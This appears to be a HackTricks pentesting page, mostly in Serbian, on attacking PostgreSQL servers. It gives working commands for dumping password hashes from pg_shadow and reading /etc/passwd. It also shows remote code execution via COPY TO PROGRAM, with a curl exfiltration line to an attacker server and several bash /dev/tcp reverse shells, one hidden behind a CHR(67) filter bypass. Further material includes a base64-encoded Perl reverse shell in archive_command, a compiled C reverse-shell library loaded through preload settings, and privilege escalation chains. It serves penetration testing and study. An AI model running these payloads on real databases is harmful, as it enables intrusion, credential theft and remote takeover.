# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Osnovne informacije**

**PostgreSQL** se opisuje kao **objektno-relacioni sistem za baze podataka** koji je **otvorenog koda**. Ovaj sistem ne samo da koristi SQL jezik, već ga i proširuje dodatnim funkcionalnostima. Njegove mogućnosti omogućavaju rad sa širokim spektrom tipova podataka i operacija, čineći ga svestranim izborom za developere i organizacije.

**Podrazumevani port:** 5432 — ukoliko je ovaj port već zauzet, izgleda da PostgreSQL koristi sledeći port (verovatno 5433) koji nije zauzet.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Povezivanje & Osnovna enumeracija
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Ako pri pokretanju **`\list`** pronađete bazu podataka pod imenom **`rdsadmin`**, znate da se nalazite u **AWS PostgreSQL bazi**.

Za više informacija o tome **kako zloupotrebiti PostgreSQL bazu podataka**, pogledajte:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Automatska enumeracija
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Prema [**ovom istraživanju**](https://www.exploit-db.com/papers/13084), kada pokušaj konekcije ne uspe, `dblink` baca izuzetak `sqlclient_unable_to_establish_sqlconnection` koji uključuje objašnjenje greške. Primeri tih detalja navedeni su u nastavku.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host je nedostupan

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port je zatvoren
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port je otvoren
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ili
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port je otvoren ili filtriran
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
U PL/pgSQL functions trenutno nije moguće dobiti detalje izuzetaka. Međutim, ako imate direktan pristup PostgreSQL serveru, možete pribaviti potrebne informacije. Ako izdvajanje korisničkih imena i lozinki iz sistemskih tabela nije izvodljivo, možete razmotriti korišćenje wordlist attack metode opisanе u prethodnom odeljku, jer bi to moglo doneti pozitivne rezultate.

## Enumeracija privilegija

### Uloge

| Tipovi uloga  |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Uloga ima superuser privilegije                                                                                                                        |
| rolinherit     | Uloga automatski nasleđuje privilegije uloga čiji je član                                                                                            |
| rolcreaterole  | Uloga može kreirati druge uloge                                                                                                                       |
| rolcreatedb    | Uloga može kreirati baze podataka                                                                                                                     |
| rolcanlogin    | Uloga može da se prijavi. To znači da ova uloga može biti dodeljena kao početni identifikator autorizacije sesije                                   |
| rolreplication | Uloga za replikaciju. Uloga za replikaciju može inicirati replikacione konekcije i kreirati i obrisati replication slots.                           |
| rolconnlimit   | Za uloge koje se mogu prijaviti, ovo postavlja maksimalan broj istovremenih konekcija koje ova uloga može napraviti. -1 znači nema ograničenja.      |
| rolpassword    | Nije lozinka (uvek se čita kao `********`)                                                                                                            |
| rolvaliduntil  | Vreme isteka lozinke (koristi se samo za autentifikaciju lozinke); null ako nema isteka                                                              |
| rolbypassrls   | Uloga zaobilazi svaku row-level security politiku, vidi [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) za više informacija. |
| rolconfig      | Uloga-specifične podrazumevane vrednosti za run-time configuration variables                                                                          |
| oid            | ID uloge                                                                                                                                             |

#### Zanimljive grupe

- Ako ste član **`pg_execute_server_program`** možete **izvršavati** programe
- Ako ste član **`pg_read_server_files`** možete **čitati** fajlove
- Ako ste član **`pg_write_server_files`** možete **pisati** fajlove

> [!TIP]
> Imajte na umu da su u Postgresu **korisnik**, **grupa** i **uloga** isto. Zavisi samo od **kako ih koristite** i da li im **dozvoljavate da se prijave**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcije
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Radnje nad fajl-sistemom

### Čitanje direktorijuma i fajlova

Od ovog [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) članovi definisane grupe **`DEFAULT_ROLE_READ_SERVER_FILES`** (nazvane **`pg_read_server_files`**) i **super users** mogu da koriste metod **`COPY`** na bilo kojoj putanji (pogledajte `convert_and_check_filename` u `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Zapamtite da ako niste super user, ali imate dozvolu **CREATEROLE**, možete da sebe dodate u tu grupu:
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Postoje i **druge postgres funkcije** koje se mogu koristiti za **čitanje fajla ili listanje direktorijuma**. Samo **superusers** i **korisnici sa eksplicitnim dozvolama** mogu da ih koriste:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Možete pronaći **više funkcija** na [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Jednostavno pisanje fajlova

Samo **super users** i članovi **`pg_write_server_files`** mogu koristiti copy za pisanje fajlova.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Запамтите да ако нисте супер корисник али имате **`CREATEROLE`** дозволе можете **направити себе чланом те групе:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Запамтите да COPY не може да обрађује newline карактере, тако да чак и ако користите base64 payload морате послати једну линију (one-liner).\
Веома важна ограничења ове технике је да **`copy` не може да се користи за писање бинарних фајлова јер мења неке бинарне вредности.**

### **Otpremanje binarnih fajlova**

Међутим, постоје **друге технике за otpremanje великих binarnih fajlova:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Ažuriranje PostgreSQL podataka tabele путем lokalnog pisanja fajla

Ако имате потребне дозволе за читање и писање фајлова PostgreSQL сервера, можете ажурирати било коју табелу на серверу тако што ћете **преписати повезани filenode** у [директоријуму података PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Више о овој техници** [**овде**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Потребни кораци:

1.  Saznajte direktorijum podataka PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Напомена:** Ако не можете да добијете тренутну путању директоријума података из settings, можете упитати главну верзију PostgreSQL помоћу `SELECT version()` и пробати да пронађете путању методом грубог претраживања. Уобичајене путање директоријума података на Unix инсталацијама PostgreSQL-а су `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Уобичајено име кластера је `main`.

2.  Добijte релативну путању до filenode-а, повезаног са циљном табелом

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Овај упит би требао вратити нешто попут `base/3/1337`. Пуна путања на диску ће бити `$DATA_DIRECTORY/base/3/1337`, нпр. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Preuzmite filenode користећи `lo_*` функције

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Добijte тип података, повезан са циљном табелом

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) да [измените filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); подесите све `rol*` boolean заставице на 1 за пун приступ.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Поново otpremite измењени filenode преко `lo_*` функција и препишите оригинални фајл на диску

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcionalno)_ Очистите keš табела у меморији покретањем захтевног SQL упита

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Сада би требало да видите ажуриране вредности у табели у PostgreSQL.

Такође можете постати superadmin тако што ћете изменити табелу `pg_authid`. **Погледајте** [**следећи одељак**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE na program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Primer za exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Zapamti da ako nisi superuser, ali imaš dozvolu **`CREATEROLE`**, možeš **učiniti sebe članom te grupe:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Or use the `multi/postgres/postgres_copy_from_program_cmd_exec` module from **metasploit**.\
More information about this vulnerability [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). While reported as CVE-2019-9193, Postges declared this was a [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass keyword filters/WAF to reach COPY PROGRAM

U SQLi kontekstima sa stacked queries, WAF može ukloniti ili blokirati literalnu ključnu reč `COPY`. Možete dinamički konstruisati naredbu i izvršiti je unutar PL/pgSQL DO bloka. Na primer, izgradite vodeće slovo C pomoću `CHR(67)` da zaobiđete naivne filtere i EXECUTE sastavljenu komandu:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Ovaj obrazac izbegava statičko filtriranje ključnih reči i ipak postiže izvršavanje OS komandi preko `COPY ... PROGRAM`. Posebno je koristan kada aplikacija ispisuje SQL greške i dozvoljava stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Kada ste iz prethodnog posta naučili **kako da otpremite binarne fajlove**, možete pokušati da dobijete **RCE otpremanjem postgresql ekstenzije i njenim učitavanjem**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> Sledeći RCE vektori su posebno korisni u ograničenim SQLi kontekstima, jer se svi koraci mogu izvesti kroz ugnježdene SELECT izjave

**Konfiguracioni fajl** PostgreSQL-a je **moguće upisati** od strane **postgres user**, koji pokreće bazu podataka, tako da kao **superuser** možete pisati fajlove u filesystem, i zato možete **prepisati ovaj fajl.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

Više informacija [o ovoj tehnici ovde](https://pulsesecurity.co.nz/articles/postgres-sqli).

Konfiguracioni fajl ima neke interesantne atribute koji mogu dovesti do RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Putanja do privatnog ključa baze podataka
- `ssl_passphrase_command = ''` Ako je privatni fajl zaštićen lozinkom (kriptovan) postgresql će **izvršiti komandu navedenu u ovom atributu**.
- `ssl_passphrase_command_supports_reload = off` **Ako** je ovaj atribut **on** onda će se **komanda** izvršiti kada se pozove `pg_reload_conf()` ako je ključ zaštićen lozinkom.

Tada napadač treba da:

1. **Preuzme privatni ključ** sa servera
2. **Enkriptuje** preuzeti privatni ključ:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Prepiše**
4. **Izdumpa** trenutnu postgresql **konfiguraciju**
5. **Prepiše** **konfiguraciju** sa pomenutim atributima:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Izvrši `pg_reload_conf()`

Tokom testiranja primetio sam da će ovo raditi samo ako **privatni fajl ključa ima privilegije 640**, da je **vlasnik root** i da pripada **grupi ssl-cert ili postgres** (tako da postgres user može da ga čita), i da se nalazi u _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**Više informacija o ovoj konfiguraciji i o WAL ovde**.

Još jedan atribut u konfiguracionom fajlu koji je iskoristiv je `archive_command`.

Da bi ovo radilo, podešavanje `archive_mode` mora biti `'on'` ili `'always'`. Ako je to tačno, onda možemo prepisati komandu u `archive_command` i naterati njeno izvršenje putem WAL (write-ahead logging) operacija.

Opšti koraci su:

1. Proverite da li je archive mode omogućen: `SELECT current_setting('archive_mode')`
2. Prepišite `archive_command` sa payload-om. Na primer, reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Ponovo učitajte konfiguraciju: `SELECT pg_reload_conf()`
4. Naterajte WAL operaciju da se pokrene, što će pozvati archive command: `SELECT pg_switch_wal()` ili `SELECT pg_switch_xlog()` za neke verzije Postgres-a

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Kada su potrebna višelinijska pisanja (npr. za podešavanje više GUC-ova), koristite PostgreSQL Large Objects da pročitate i u celosti prepišete konfiguracioni fajl iz SQL-a. Ovaj pristup je idealan u SQLi kontekstima gde `COPY` ne može da rukuje novim redovima ili binarno-safe upisima.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
This yields reliable OS command execution via `archive_command` as the `postgres` user, provided `archive_mode` is enabled. In practice, setting a low `archive_timeout` can cause rapid invocation without requiring an explicit WAL switch.

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- biblioteke koje će PostgreSQL server učitati pri klijentskoj konekciji.
- `dynamic_library_path` -- lista direktorijuma u kojima će PostgreSQL server tražiti biblioteke.

We can set the `dynamic_library_path` value to a directory, writable by the `postgres` user running the database, e.g., `/tmp/` directory, and upload a malicious `.so` object there. Next, we will force the PostgreSQL server to load our newly uploaded library by including it in the `session_preload_libraries` variable.

The attack steps are:

1. Preuzmite originalni `postgresql.conf`
2. Uključite direktorijum `/tmp/` u vrednost `dynamic_library_path`, npr. `dynamic_library_path = '/tmp:$libdir'`
3. Uključite ime zlonamerne biblioteke u vrednost `session_preload_libraries`, npr. `session_preload_libraries = 'payload.so'`
4. Proverite glavnu verziju PostgreSQL-a pomoću upita `SELECT version()`
5. Kompajlirajte kod zlonamerne biblioteke sa odgovarajućim PostgreSQL dev paketom Primer koda:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Otpremite zlonamerni `postgresql.conf` koji ste napravili u koracima 2-3 i prepišite originalni fajl
7. Otpremite `payload.so` iz koraka 5 u direktorijum `/tmp`
8. Ponovo učitajte konfiguraciju servera restartovanjem servera ili pozivanjem upita `SELECT pg_reload_conf()`
9. Pri sledećoj DB konekciji dobićete reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

Dakle, ako imate dozvolu **`CREATEROLE`**, možete sebi dodeliti pristup drugim **rolama** (koje nisu superuser) koje vam mogu omogućiti čitanje i pisanje fajlova i izvršavanje komandi:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Promena lozinke

Korisnici sa ovom ulogom takođe mogu **promeniti** **lozinke** drugih **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Često se može naći da **lokalni korisnici mogu da se prijave u PostgreSQL bez unošenja lozinke**. Dakle, kada prikupite **dozvole za izvršavanje koda**, možete zloupotrebiti te dozvole da dobijete ulogu **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Ovo je obično moguće zbog sledećih linija u **`pg_hba.conf`** fajlu:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) is explained how it was possible to **privesc** in Postgres GCP abusing ALTER TABLE privilege that was granted to the user.

When you try to **make another user owner of a table** you should get an **error** preventing it, but apparently GCP gave that **option to the not-superuser postgres user** in GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Spajajući ovu ideju sa činjenicom da kada se komande **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) izvrše nad **tabelom sa index funkcijom**, ta **funkcija** se **poziva** kao deo komande koristeći privilegije **vlasnika tabele**. It's possible to create an index with a function and give owner permissions to a **super user** over that table, and then run ANALYZE over the table with the malicious function that will be able to execute commands because it's using the privileges of the owner.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Počnite kreiranjem nove tabele.
2. Ubacite neke irelevantne podatke u tabelu kako biste obezbedili podatke za index function.
3. Razvijte zlonamernu index function koja sadrži code execution payload, omogućavajući izvršavanje neautorizovanih komandi.
4. ALTER vlasnika tabele na "cloudsqladmin", koji je GCP-ova superuser uloga koju Cloud SQL ekskluzivno koristi za upravljanje i održavanje baze podataka.
5. Izvršite ANALYZE nad tabelom. Ova akcija primorava PostgreSQL engine da se prebaci u korisnički kontekst vlasnika tabele, "cloudsqladmin". Kao posledica, zlonamerna index function se poziva sa privilegijama "cloudsqladmin", čime se omogućava izvršavanje prethodno neovlašćene shell komande.

In PostgreSQL, this flow looks something like this:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Zatim će tabela `shell_commands_results` sadržati izlaz izvršenog koda:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalna prijava

Neke pogrešno konfigurisane postgresql instance mogu dozvoliti prijavu bilo kojeg lokalnog korisnika, moguće je prijaviti se lokalno sa 127.0.0.1 koristeći **`dblink` funkciju**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Imajte na umu da da bi prethodni upit radio **mora postojati funkcija `dblink`**. Ako ne postoji, možete je pokušati kreirati sa
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Ako imate lozinku korisnika sa više privilegija, ali taj korisnik nije dozvoljen da se prijavi sa spoljnog IP-a, možete koristiti sledeću funkciju da izvršavate upite kao taj korisnik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Moguće je proveriti da li ova funkcija postoji pomoću:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Prilagođena funkcija sa** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters su uspeli da izvrše privesc unutar postgres instance koju je obezbedio IBM, jer su **pronašli ovu funkciju sa SECURITY DEFINER flagom**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Kao što je [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) funkcija sa **SECURITY DEFINER se izvršava** sa privilegijama **korisnika koji je njen vlasnik**. Dakle, ako je funkcija **ranjiva na SQL Injection** ili izvršava neke **privilegovane akcije sa parametrima koje kontroliše napadač**, može se zloupotrebiti za **eskalaciju privilegija unutar postgres**.

U liniji 4 prethodnog koda možete videti da funkcija ima **SECURITY DEFINER** flag.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
A zatim **izvršite komande**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

**PL/pgSQL** je **potpuno opremljen programski jezik** koji nudi veću proceduralnu kontrolu u poređenju sa SQL. Omogućava upotrebu **petlji** i drugih **kontrolnih struktura** za unapređenje logike programa. Pored toga, **SQL statements** i **triggers** mogu pozivati funkcije koje su kreirane koristeći **PL/pgSQL language**. Ova integracija omogućava sveobuhvatniji i svestraniji pristup programiranju i automatizaciji baza podataka.\
**Možete zloupotrebiti ovaj jezik da zatražite od PostgreSQL da izvrši brute-force nad korisničkim akreditivima.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Sledeći privesc vektor je posebno koristan u ograničenim SQLi kontekstima, jer se svi koraci mogu izvršiti kroz ugnježdene SELECT izraze

Ako možete **čitati i pisati PostgreSQL server fajlove**, možete **postati superuser** prepisivanjem PostgreSQL on-disk filenode povezanog sa internom tabelom `pg_authid`.

Pročitajte više o **ovoj tehnici** [**ovde**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

